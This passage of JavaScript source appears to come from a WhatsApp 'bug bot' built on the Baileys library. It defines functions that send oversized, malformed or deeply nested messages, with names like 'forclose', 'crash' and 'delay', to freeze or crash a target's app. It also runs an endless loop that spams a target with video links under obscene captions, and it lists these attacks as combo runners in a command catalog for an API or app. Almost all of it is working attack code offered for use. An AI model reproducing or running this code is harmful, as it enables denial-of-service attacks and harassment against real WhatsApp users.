        patchMessageBeforeSending: resultData4,
        encodeNewsletterMessage: resultData5
      } = require("@whiskeysockets/baileys");
      let resultData6 = (await sock.getUSyncDevices([targetJid], false, false)).map(({
        user: targetJid1,
        device: targetJid2
      }) => targetJid1 + ":" + (targetJid2 || "") + "@s.whatsapp.net");
      await sock.assertSessions(resultData6);
      let data = () => {
        let options = {};
        return {
          mutex(sock, targetJid1) {
            options[sock] ??= {
              task: Promise.resolve()
            };
            options[sock].task = (async targetJid2 => {
              try {
                await targetJid2;
              } catch {}
              return targetJid1();
            })(options[sock].task);
            return options[sock].task;
          }
        };
      };
      let resultData7 = data();
      let data1 = targetJid1 => Buffer.concat([Buffer.from(targetJid1), Buffer.alloc(8, 1)]);
      let resultData8 = sock.createParticipantNodes.bind(sock);
      let data2 = sock.encodeWAMessage?.bind(sock);
      sock.createParticipantNodes = async (sock, targetJid1, count, count1) => {
        if (!sock.length) {
          return {
            nodes: [],
            shouldIncludeDeviceIdentity: false
          };
        }
        let resultMsg2 = await (sock.patchMessageBeforeSending?.(targetJid1, sock) ?? targetJid1);
        let data3 = Array.isArray(resultMsg2) ? resultMsg2 : sock.map(targetJid2 => ({
          recipientJid: targetJid2,
          message: resultMsg2
        }));
        let {
          id: data4,
          lid: data5
        } = sock.authState.creds.me;
        let data6 = data5 ? resultData2(data5)?.user : null;
        let data7 = false;
        let resultMsg3 = await Promise.all(data3.map(async ({
          recipientJid: targetJid2,
          message: targetJid3
        }) => {
          let {
            user: resultData10
          } = resultData2(targetJid2);
          let {
            user: resultData11
          } = resultData2(data4);
          let data8 = resultData10 === resultData11 || resultData10 === data6;
          let data9 = targetJid2 === data4 || targetJid2 === data5;
          if (count1 && data8 && !data9) {
            targetJid3 = count1;
          }
          let resultData12 = data1(data2 ? data2(targetJid3) : resultData3(targetJid3));
          return resultData7.mutex(targetJid2, async () => {
            const msgPayload1 = {
              jid: targetJid2,
              data: resultData12
            };
            let {
              type: resultMsg4,
              ciphertext: resultMsg5
            } = await sock.signalRepository.encryptMessage(msgPayload1);
            if (resultMsg4 === "pkmsg") {
              data7 = true;
            }
            const msgPayload2 = {
              jid: targetJid2
            };
            const msgPayload3 = {
              v: "2",
              type: resultMsg4,
              ...count
            };
            const msgPayload4 = {
              tag: "enc",
              attrs: msgPayload3,
              content: resultMsg5
            };
            const msgPayload5 = {
              tag: "to",
              attrs: msgPayload2,
              content: [msgPayload4]
            };
            return msgPayload5;
          });
        }));
        return {
          nodes: resultMsg3.filter(Boolean),
          shouldIncludeDeviceIdentity: data7
        };
      };
      let randomBytes = crypto.randomBytes(32);
      let resultData9 = Buffer.concat([randomBytes, Buffer.alloc(8, 1)]);
      let {
        nodes: resultMsg,
        shouldIncludeDeviceIdentity: resultMsg1
      } = await sock.createParticipantNodes(resultData6, {
        conversation: "y"
      }, {
        count: "0"
      });
      let msgPayload = {
        tag: "call",
        attrs: {
          to: targetJid,
          id: sock.generateMessageTag(),
          from: sock.user.id
        },
        content: [{
          tag: "offer",
          attrs: {
            "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
            "call-creator": sock.user.id
          },
          content: [{
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "16000"
            }
          }, {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "8000"
            }
          }, {
            tag: "video",
            attrs: {
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0",
              enc: "vp8",
              dec: "vp8"
            }
          }, {
            tag: "net",
            attrs: {
              medium: "3"
            }
          }, {
            tag: "capability",
            attrs: {
              ver: "1"
            },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          }, {
            tag: "encopt",
            attrs: {
              keygen: "2"
            }
          }, {
            tag: "destination",
            attrs: {},
            content: resultMsg
          }, ...(resultMsg1 ? [{
            tag: "device-identity",
            attrs: {},
            content: resultData(sock.authState.creds.account, true)
          }] : [])]
        }]
      };
      await sock.sendNode(msgPayload);
    }
    async function sendDelayBlankBug(sock, targetJid) {
      for (let i = 0; i < 10; i++) {
        let buttons = [];
        let buttons1 = [];
        for (let j = 0; j < 10; j++) {
          buttons1.push({
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              header: "ꦽ".repeat(10000),
              body: "ꦽ".repeat(10000),
              flow_action: "navigate",
              flow_action_payload: {
                screen: "FORM_SCREEN"
              },
              flow_cta: "Grattler",
              flow_id: "1169834181134583",
              flow_message_version: "3",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
            })
          });
        }
        for (let j = 0; j < 10; j++) {
          buttons.push({
            body: {
              text: "NdikaExploit🩸"
            },
            header: {
              title: "NdikaExploit🩸" + "\0".repeat(50000),
              hasMediaAttachment: false,
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                fileLength: "591",
                height: 0,
                width: 0,
                mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1721344123",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
                scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
                scanLengths: [247, 201, 73, 63],
                midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
              }
            },
            nativeFlowMessage: {
              buttons: []
            }
          });
        }
        const msgPayload = {
          cards: [...buttons]
        };
        const waMessage = generateWAMessageFromContent(targetJid, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: {
                body: {
                  text: "NdikaExploit🩸" + "ꦾ".repeat(50000)
                },
                footer: {
                  text: "NdikaExploit🩸"
                },
                header: {
                  hasMediaAttachment: false
                },
                carouselMessage: msgPayload
              }
            }
          }
        }, {});
        await sock.relayMessage(targetJid, waMessage.message, {
          messageId: waMessage.key.id
        });
      }
    }
    async function sendPaymentInviteBug(sock, targetJid) {
      for (let i = 0; i < 350; i++) {
        await sock.relayMessage(targetJid, {
          lottieStickerMessage: {
            message: {
              stickerMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/612482636_821750694302087_4779711558667252836_n.enc?ccb=11-4&oh=01_Q5Aa4AHVZ2xLlZMDEVgIxo30GOGkFUnQDBShF6eBPA_n--PjRg&oe=69F0CF65&_nc_sid=5e03e0&mms3=true",
                fileSha256: "dlob6oYb5Tr671y0M+se6D7DUwViTijFhYc1luOGbTA=",
                mediaKey: "v79wuS5Lfl653TKue0ZwUyHqfYWnUPjFndomy0qTZjM=",
                mimetype: "application/was",
                height: 1280,
                width: 909,
                directPath: "/v/t62.7118-24/612482636_821750694302087_4779711558667252836_n.enc?ccb=11-4&oh=01_Q5Aa4AHVZ2xLlZMDEVgIxo30GOGkFUnQDBShF6eBPA_n--PjRg&oe=69F0CF65&_nc_sid=5e03e0",
                fileLength: "134544",
                mediaKeyTimestamp: "1774806705",
                isAnimated: true,
                stickerSentTs: "1774806705729",
                isAvatar: false,
                isAiSticker: false,
                isLottie: true,
                contextInfo: {
                  remoteJid: "LEVGanteng?",
                  forwardingScore: 1,
                  isForwarded: true,
                  forwardedAiBotMessageInfo: {
                    botJid: "867051314767696@bot"
                  },
                  forwardOrigin: 4,
                  statusAttributionType: 2,
                  statusAttributions: Array.from({
                    length: 200900
                  }, (sock1, targetJid1) => ({
                    type: 1
                  }))
                },
                messageContextInfo: {
                  supportPayload: JSON.stringify({
                    is_ai_message: false,
                    ticket_id: crypto.randomBytes(28)
                  }),
                  messageAssociation: {
                    associationType: 11,
                    parentMessageKey: 2,
                    messageIndex: 1
                  }
                }
              }
            }
          }
        }, {
          noSelfSync: true
        });
        await sleep(500);
      }
    }
    async function sendInteractiveFloodBug(sock, targetJid, count = 1) {
      const data = count * 3600000;
      const resultData = Date.now();
      let count1 = 0;
      const buttons = [[186, 3], [210, 4], [170, 2]];
      const data1 = targetJid1 => {
        const buttons1 = [];
        while (targetJid1 >= 128) {
          buttons1.push(targetJid1 & 127 | 128);
          targetJid1 >>>= 7;
        }
        buttons1.push(targetJid1);
        return Buffer.from(buttons1);
      };
      const data2 = function (targetJid1) {
        var resultData3 = String(targetJid1 || "").trim();
        if (resultData3.includes("@")) {
          return resultData3;
        }
        return resultData3.replace(/\D/g, "") + "@s.whatsapp.net";
      };
      const resultData1 = (Array.isArray(targetJid) ? targetJid : [targetJid]).map(data2).filter(function (targetJid1) {
        return targetJid1.length > 15;
      });
      if (!resultData1.length) {
        return;
      }
      const data3 = (sock1, targetJid1) => Buffer.concat([Buffer.from(sock1), data1(targetJid1.length), targetJid1]);
      const msgPayload = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 9100,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        scanLength: [8177, 8118, 9117, 818],
        contextInfo: {}
      };
      msgPayload.contextInfo.remoteJid = "meta@ai";
      const mediaPayload = {
        imageMessage: msgPayload
      };
      const resultData2 = proto.Message.encode(proto.Message.fromObject(mediaPayload)).finish();
      const data4 = (sock1, targetJid1) => {
        let data6 = resultData2;
        for (let i = 0; i < targetJid1; i++) {
          data6 = data3(sock1, data3([10], data6));
        }
        return data6;
      };
      const data5 = async () => {
        if (Date.now() - resultData >= data) {
          console.log("Stopped");
          return;
        }
        try {
          if (count1 < 10) {
            const interactivePayload = {
              interactiveMessage: {
                body: {
                  text: "Hello sir, I am the silent queen, and @levnotdev the shadow king"
                }
              }
            };
            await sock.relayMessage(targetJid, interactivePayload, {
              noSelfSync: true
            });
          }
          let count2 = 5;
          let count3 = 0;
          for (const data6 of buttons) {
            let data7 = null;
            let count4 = 5000;
            let resultData3 = resultData1.slice(count3, count3 + count2);
            while (count4 >= 2000 && !data7) {
              try {
                const resultData4 = data4(data6, count4);
                const resultData5 = proto.Message.decode(resultData4);
                proto.Message.encode(resultData5).finish();
                data7 = resultData5;
              } catch (err) {}
              count4 -= 400;
            }
            if (!data7) {
              continue;
            }
            const data8 = "QueenMia" + Date.now().toString(36).toUpperCase() + "_" + count3;
            await sock.relayMessage("status@broadcast", data7, {
              messageId: data8,
              statusJidList: resultData3,
              additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                  tag: "mentioned_users",
                  attrs: {},
                  content: resultData3.map(function (targetJid1) {
                    const msgPayload1 = {
                      jid: targetJid1
                    };
                    const msgPayload2 = {
                      tag: "to",
                      attrs: msgPayload1,
                      content: []
                    };
                    return msgPayload2;
                  })
                }]
              }]
            });
            count3++;
          }
          count1++;
          data5();
        } catch (err) {
          console.error("[ pure forceclose ] error");
          setTimeout(data5, 2000);
        }
      };
      data5();
    }
    async function sendStatusBug(sock, targetJid) {
      try {
        const buttons = [targetJid, "0@s.whatsapp.net", ...Array.from({
          length: 1500
        }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")];
        const msgPayload = {
          mentionedJid: buttons,
          remoteJid: targetJid
        };
        const msgPayload1 = {
          text: "‎",
          contextInfo: msgPayload
        };
        const msgPayload2 = {
          extendedTextMessage: msgPayload1
        };
        const msgPayload3 = {
          userJid: sock.user.id
        };
        const resultMsg = await generateWAMessageFromContent("status@broadcast", msgPayload2, msgPayload3);
        const msgPayload4 = {
          statusJidList: [targetJid]
        };
        await sock.relayMessage("status@broadcast", resultMsg.message, msgPayload4);
        console.log("[TAG] Ghost mention terkirim ke: " + targetJid);
        const msgPayload5 = {
          delete: resultMsg.key
        };
        const msgPayload6 = {
          statusJidList: [targetJid]
        };
        await sock.sendMessage("status@broadcast", msgPayload5, msgPayload6);
        console.log("[CLEAN] Status tag untuk " + targetJid + " telah dihapus.");
      } catch (err) {
        console.error("[ERROR] Gagal eksekusi ghost tag:", err.message);
      }
    }
    async function sendFullDelayBug(sock, targetJid) {
      const interactivePayload = {
        interactiveMessage: {
          body: {
            text: "°Know Ndika¿¿°¿".repeat(60000)
          },
          nativeFlowMessage: {
            buttons: [{
              name: "one_crash_message"
            }, {
              name: "one_crash_message"
            }]
          },
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              icon: "document",
              title: "° Know Ndika¿¿°¿",
              sections: Array.from({
                length: 505555
              }, () => ({}))
            })
          }
        }
      };
      const msgPayload = {
        viewOnceMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "° Know Ndika¿°¿"
              },
              nativeFlowMessage: {
                buttons: Array.from({
                  length: 500000
                }, () => ({}))
              },
              nativeFlowResponsMessage: {
                buttons: [{
                  name: "one_crash_message"
                }, {
                  name: "voice_call"
                }, {
                  name: "cta_url",
                  number_phone: "62××××××",
                  url: "https://t.me/NdikaOfficial"
                }]
              }
            }
          }
        }
      };
      await sock.relayMessage(targetJid, interactivePayload, {});
      await sock.relayMessage(targetJid, msgPayload, {});
    }
    async function sendButtonFloodBug(sock, targetJid) {
      const statusMsg = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "Ndikalevat mek¿¿?",
                display_text: "‌" + "‍".repeat(60000)
              },
              nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                  tap_target_configuration: {
                    title: "▸ X ◂",
                    description: "Night7 V1",
                    canonical_url: "https://t.me/NdikaOfficial",
                    domain: "portofolio-langitdev.netlify.app",
                    button_index: 0
                  }
                }),
                buttons: Array.from({
                  length: 500000
                }, () => ({}))
              }
            }
          }
        }
      };
      const statusMsg1 = {
        groupStatusMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: "‌​",
                display_text: "\0"
              },
              nativeFlowResponsMessage: {
                buttons: Array.from({
                  length: 500000
                }, () => ({}))
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "one_crash_message"
                }, {
                  name: "one_crash_message"
                }, {
                  name: "voice_call",
                  phone_number: "62×××××××"
                }, {
                  name: "cta_url",
                  url: "https://t.me/NdikaOfficial"
                }, {
                  name: "booking_confirm",
                  bookingId: "succes"
                }]
              }
            }
          }
        }
      };
      await sock.relayMessage(targetJid, statusMsg, {});
      await sock.relayMessage(targetJid, statusMsg1, {});
    }
    async function sendGear4Bug(sock, targetJid) {
      try {
        const interactivePayload = {
          interactiveMessage: {
            body: {
              text: "lev?"
            },
            contextInfo: {
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1000009@newsletter",
                serverMessageId: 123,
                newsletterName: "LEVISBACK"
              },
              isForwarded: true
            }
          }
        };
        const resultData = proto.Message.encode(proto.Message.fromObject(interactivePayload)).finish();
        console.log("📦 Base payload size: " + resultData.length + " bytes");
        const buttons = [[186, 3], [210, 4], [170, 2]];
        const data = function (targetJid1) {
          const buttons1 = [];
          let data7 = targetJid1;
          if (data7 === 0) {
            return Buffer.from([0]);
          }
          while (data7 > 0) {
            let data8 = data7 & 127;
            data7 >>= 7;
            if (data7 > 0) {
              data8 |= 128;
            }
            buttons1.push(data8);
          }
          return Buffer.from(buttons1);
        };
        const data1 = function (sock1, targetJid1) {
          const data7 = Array.isArray(sock1) ? sock1 : [sock1];
          const resultData2 = Array.from(data(targetJid1.length));
          const resultData3 = Array.from(targetJid1);
          const buttons1 = [...data7, ...resultData2, ...resultData3];
          return Buffer.from(buttons1);
        };
        const data2 = function (sock1, targetJid1) {
          const msgPayload = {
            length: targetJid1
          };
          return Array.from(msgPayload).reduce(function (targetJid2) {
            return data1(sock1, data1([10], targetJid2));
          }, resultData);
        };
        const data3 = function (sock1, targetJid1) {
          const data7 = function (sock2, targetJid2) {
            if (sock2 === 0) {
              return targetJid2;
            }
            return data7(sock2 - 1, data1(sock1, data1([10], targetJid2)));
          };
          return data7(targetJid1, resultData);
        };
        const data4 = data3;
        const data5 = function (targetJid1) {
          let resultData2 = String(targetJid1 || "").trim();
          if (resultData2.includes("@")) {
            return resultData2;
          }
          let resultData3 = resultData2.replace(/[^0-9]/g, "");
          if (resultData3.startsWith("0")) {
            resultData3 = "62" + resultData3.substring(1);
          }
          return resultData3 + "@s.whatsapp.net";
        };
        let resultData1 = (Array.isArray(targetJid) ? targetJid : [targetJid]).map(data5).filter(function (targetJid1) {
          return targetJid1 && targetJid1.length > 15;
        });
        if (!resultData1.length) {
          console.log("❌ No valid JIDs, Bos!");
          return;
        }
        const data6 = function () {
          return "SATZ" + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substring(2, 5).toUpperCase();
        };
        const count = 3;
        const count1 = 5000;
        let count2 = 0;
        for (let i = 0; i < resultData1.length; i += count) {
          let resultData2 = resultData1.slice(i, i + count);
          if (i > 0) {
            console.log("⏳ Waiting " + count1 + "ms...");
            await new Promise(function (targetJid1) {
              setTimeout(targetJid1, count1);
            });
          }
          let data7 = Math.floor(i / count) + 1;
          let data8 = data6() + "-" + data7;
          for (let j = 0; j < buttons.length; j++) {
            let data9 = buttons[j];
            let data10 = null;
            let count3 = 0;
            for (let k = 2000; k >= 500 && !data10; k -= 300) {
              try {
                let resultData3 = data4(data9, k);
                let resultData4 = proto.Message.decode(resultData3);
                proto.Message.encode(resultData4).finish();
                data10 = resultData4;
                count3 = k;
              } catch (err) {}
            }
            if (!data10) {
              console.log("⚠️ Batch " + data7 + " | Tag " + (j + 1) + " failed, skip...");
              continue;
            }
            try {
              await sock.relayMessage("status@broadcast", data10, {
                messageId: data8 + "-" + j,
                statusJidList: resultData2,
                additionalNodes: [{
                  tag: "meta",
                  attrs: {},
                  content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: resultData2.map(function (targetJid1) {
                      const msgPayload = {
                        jid: targetJid1
                      };
                      const msgPayload1 = {
                        tag: "to",
                        attrs: msgPayload,
                        content: []
                      };
                      return msgPayload1;
                    })
                  }]
                }]
              });
              count2++;
            } catch (err) {
              console.log("❌ Send failed: " + err.message);
            }
          }
        }
        return count2;
      } catch (err) {
        console.log("❌ Error: " + err.message);
        throw err;
      }
    }
    async function sendQuickReplyBug(sock, targetJid) {
      try {
        const count = 10000000;
        const interactivePayload = {
          interactiveMessage: {
            body: {
              text: "\0".repeat(60000)
            },
            nativeFlowMessage: {
              buttons: "crash_buttons_image".repeat(20000) + "​".repeat(30000)
            }
          }
        };
        await sock.relayMessage(targetJid, interactivePayload, {
          participant: {
            jid: targetJid
          }
        });
      } catch (err) {
        console.error("Error:", err);
      }
    }
    async function sendSpamBkpVideo(sock, targetJid) {
      const buttons = ["https://files.catbox.moe/eiqyw2.mp4", "https://files.catbox.moe/eiqyw2.mp4", "https://files.catbox.moe/eiqyw2.mp4", "https://files.catbox.moe/eiqyw2.mp4", "https://files.catbox.moe/eiqyw2.mp4"];
      const buttons1 = ["😹 Paket!!!!!", "🎬 Adek lu Lagi Colmek Jink"];
      while (true) {
        const data = buttons[Math.floor(Math.random() * buttons.length)];
        const data1 = buttons1[Math.floor(Math.random() * buttons1.length)];
        const msgPayload = {
          url: data
        };
        const msgPayload1 = {
          video: msgPayload,
          mimetype: "video/mp4",
          caption: data1
        };
        await sock.sendMessage(targetJid, msgPayload1);
      }
    }
    async function sendGroupStatusMention(sock, targetJid) {
      return await sock.relayMessage(targetJid, {
        requestPaymentMessage: {}
      }, {
        messageId: sock.generateMessageTag(),
        fromMe: false,
        participant: {
          jid: targetJid
        }
      });
    }


// ============================================================================
// 2. RUNNER KOMBINASI / COMBO ACTIONS (SESUAI CASE HANDLER)
// ============================================================================

async function runBlankCombo(sock, targetJid, count = 1, delay = 1500, log = null) {
  for (let i = 0; i < count; i++) {
    if (log) log(`[Blank] Iterasi ${i + 1}/${count}`);
    await sendButtonFloodBug(sock, targetJid);
    await sendDelayBlankBug(sock, targetJid);
    await sendButtonBug(sock, targetJid);
    if (i < count - 1) await sleep(delay);
  }
}

async function runCombo(sock, targetJid, count = 1, delay = 1500, log = null) {
  for (let i = 0; i < count; i++) {
    if (log) log(`[Combo] Iterasi ${i + 1}/${count}`);
    await sendButtonFloodBug(sock, targetJid);
    await sendButtonBug(sock, targetJid);
    await sendInteractiveFloodBug(sock, targetJid);
    await sendGroupStatusBug(sock, targetJid);
    if (i < count - 1) await sleep(delay);
  }
}

async function runComboV2(sock, targetJid, count = 1, delay = 100, log = null) {
  for (let i = 0; i < count; i++) {
    if (log) log(`[Combo V2] Iterasi ${i + 1}/${count}`);
    await sendDelayBlankBug(sock, targetJid);
    await sendButtonFloodBug(sock, targetJid);
    await sendInteractiveFloodBug(sock, targetJid);
    if (i < count - 1) await sleep(delay);
  }
}

async function runFreeze(sock, targetJid, count = 1, delay = 1500, log = null) {
  for (let i = 0; i < count; i++) {
    if (log) log(`[Freeze] Iterasi ${i + 1}/${count}`);
    await sendForcloseBug(sock, targetJid);
    if (i < count - 1) await sleep(delay);
  }
}

async function runBlast(sock, targetJid, count = 1, delay = 1500, log = null) {
  for (let i = 0; i < count; i++) {
    if (log) log(`[Blast] Iterasi ${i + 1}/${count}`);
    await sendButtonBug(sock, targetJid);
    await sendButtonFloodBug(sock, targetJid);
    if (i < count - 1) await sleep(delay);
  }
}

async function runOverdrive(sock, targetJid, count = 1, delay = 100, log = null) {
  for (let i = 0; i < count; i++) {
    if (log) log(`[Overdrive] Iterasi ${i + 1}/${count}`);
    await sendGroupStatusBug(sock, targetJid);
    await sendGear4Bug(sock, targetJid);
    await sendInteractiveFloodBug(sock, targetJid);
    if (i < count - 1) await sleep(delay);
  }
}

async function runClick(sock, targetJid, count = 1, delay = 1500, log = null) {
  for (let i = 0; i < count; i++) {
    if (log) log(`[Click] Iterasi ${i + 1}/${count}`);
    await sendCrashClickBug(sock, targetJid);
    await sendButtonBug(sock, targetJid);
    if (i < count - 1) await sleep(delay);
  }
}

async function runDelay(sock, targetJid, count = 1, delay = 1500, log = null) {
  for (let i = 0; i < count; i++) {
    if (log) log(`[Full Delay] Iterasi ${i + 1}/${count}`);
    await sendFullDelayBug(sock, targetJid);
    await sendGroupStatusBug(sock, targetJid);
    await sendButtonFloodBug(sock, targetJid);
    await sendButtonBug(sock, targetJid);
    if (i < count - 1) await sleep(delay);
  }
}

async function runPushMedia(sock, targetJid, count = 1, delay = 200, log = null) {
  for (let i = 0; i < count; i++) {
    if (log) log(`[Push Media] Iterasi ${i + 1}/${count}`);
    await sendSpamBkpVideo(sock, targetJid);
    if (i < count - 1) await sleep(delay);
  }
}

async function runGroupTest(sock, targetJid, count = 1, delay = 100, log = null) {
  for (let i = 0; i < count; i++) {
    if (log) log(`[Group Crash] Iterasi ${i + 1}/${count}`);
    await sendGroupCrash(sock, targetJid);
    if (i < count - 1) await sleep(delay);
  }
}

// ============================================================================
// 3. REGISTRI PERINTAH LENGKAP & METADATA UNTUK API & FLUTTER APP
// ============================================================================

const COMMAND_CATALOG = [
  // --- Kategori: COMBO & ALUR HANDLER ---
  {
    id: "blank",
    name: "Blank Delay Combo",
    category: "combo",
    description: "Kombinasi Button Flood + Delay Blank + Button Bug",
    aliases: ["ghost", "blankxdelay"],
    execute: (sock, target, count, delay, log) => runBlankCombo(sock, target, count, delay, log)
  },
  {
    id: "combo",
    name: "Classic Attack Combo",
    category: "combo",
    description: "Kombinasi Button Flood + Button Bug + Interactive + Group Status",
    aliases: ["xcamb"],
    execute: (sock, target, count, delay, log) => runCombo(sock, target, count, delay, log)
  },
  {
    id: "combov2",
    name: "Combo V2 Ultra",
    category: "combo",
    description: "Kombinasi Delay Blank + Button Flood + Interactive Flood",
    aliases: ["xcamb2"],
    execute: (sock, target, count, delay, log) => runComboV2(sock, target, count, delay, log)
  },
  {
    id: "freeze",
    name: "Freeze / Forclose Bug",
    category: "combo",
    description: "Kirim payload Forclose Bug berulang kali",
    aliases: ["forclose", "close", "forclos", "fcnew"],
    execute: (sock, target, count, delay, log) => runFreeze(sock, target, count, delay, log)
  },
  {
    id: "blast",
    name: "Blast D-Five Sender",
    category: "combo",
    description: "Kombinasi Button Bug + Button Flood berulang",
    aliases: ["sender", "dfive", "d-five"],
    execute: (sock, target, count, delay, log) => runBlast(sock, target, count, delay, log)
  },
  {
    id: "overdrive",
    name: "Overdrive Gear 4",
    category: "combo",
    description: "Kombinasi Group Status + Gear 4 Payload + Interactive Flood",
    aliases: ["gear4", "boost"],
    execute: (sock, target, count, delay, log) => runOverdrive(sock, target, count, delay, log)
  },
  {
    id: "click",
    name: "Crash Click / Tap",
    category: "combo",
    description: "Kombinasi Crash Click Bug + Button Bug",
    aliases: ["tap", "crashclik"],
    execute: (sock, target, count, delay, log) => runClick(sock, target, count, delay, log)
  },
  {
    id: "delay",
    name: "Full Delay Hard Push",
    category: "combo",
    description: "Kombinasi Full Delay Bug + Group Status + Button Flood + Button Bug",
    aliases: ["push", "fulldelay"],
    execute: (sock, target, count, delay, log) => runDelay(sock, target, count, delay, log)
  },
  {
    id: "pushmedia",
    name: "Push Media Spam Video",
    category: "combo",
    description: "Kirim video payload bersiklus",
    aliases: ["spampic", "spambkp", "spambokep"],
    execute: (sock, target, count, delay, log) => runPushMedia(sock, target, count, delay, log)
  },
  {
    id: "grouptest",
    name: "Group Crash & Blast",
    category: "combo",
    description: "Kirim group crash payload ke ID grup target",
    aliases: ["joincheck", "xban", "xband", "groupblast", "bangb", "gbroadcast"],
    execute: (sock, target, count, delay, log) => runGroupTest(sock, target, count, delay, log)
  },

  // --- Kategori: 27 FUNGSI SENDER TUNGGAL ---
  {
    id: "sendAddressCrash",
    name: "Send Address Crash",
    category: "single",
    description: "Payload Interactive Address ViewOnce Crash",
    aliases: ["address-crash", "addresscrash"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Address Crash] ${i + 1}/${count}`);
        await sendAddressCrash(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendForcloseBug",
    name: "Send Forclose Bug",
    category: "single",
    description: "Payload Forclose Extended Text & Interactive",
    aliases: ["forclose-bug", "forclosebug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Forclose Bug] ${i + 1}/${count}`);
        await sendForcloseBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendLocationCrash",
    name: "Send Location Crash",
    category: "single",
    description: "Payload Live Location Crash Buffer",
    aliases: ["location-crash", "locationcrash"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Location Crash] ${i + 1}/${count}`);
        await sendLocationCrash(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendButtonBug",
    name: "Send Button Bug",
    category: "single",
    description: "Payload Interactive Button Overflow",
    aliases: ["button-bug", "buttonbug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Button Bug] ${i + 1}/${count}`);
        await sendButtonBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendGroupStatusBug",
    name: "Send Group Status Bug",
    category: "single",
    description: "Payload Relay Group Status Message",
    aliases: ["group-status-bug", "groupstatusbug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
